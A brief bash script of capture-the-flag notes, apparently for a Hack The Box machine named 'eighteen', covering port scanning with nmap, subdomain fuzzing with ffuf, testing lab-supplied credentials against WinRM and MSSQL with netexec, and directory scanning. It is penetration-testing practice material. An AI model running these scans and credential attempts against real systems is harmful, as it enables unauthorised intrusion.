#! /bin/bash

# Port scanning
sudo nmap -p- -vvv --min-rate 10000 10.129.21.40
#80/tcp   open  http     syn-ack ttl 127
#1433/tcp open  ms-sql-s syn-ack ttl 127
#5985/tcp open  wsman    syn-ack ttl 127

sudo nmap -p 80,1433,5985 -sCV 10.129.21.40

# Brute force subdomains
ffuf -u http://10.129.21.40 -H "Host: FUZZ.eighteen.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

# Given some credentials kevin / iNa2we6haRj2gaw!
netexec winrm eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!'
# It doesn’t work as a domain account for MSSQL, but does work for a local MSSQL account:
netexec mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!'
netexec mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth


feroxbuster -u http://eighteen.htb

